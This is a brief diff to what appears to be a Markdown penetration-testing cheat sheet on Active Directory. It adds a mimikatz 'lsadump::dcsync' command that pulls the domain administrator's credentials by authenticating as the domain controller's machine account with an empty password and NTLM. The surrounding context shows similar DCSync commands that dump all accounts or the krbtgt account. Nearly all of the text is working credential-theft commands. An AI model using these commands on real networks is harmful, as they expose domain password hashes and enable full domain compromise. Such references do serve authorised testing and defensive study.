@@ -335,6 +335,9 @@ mimikatz# lsadump::dcsync /domain:fqdn /all /csv
 
 # Dump for specific user
 mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
+
+# Dump (if no privileged user session)
+lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
 ```
 
 ## Remote Authentication Between Computers
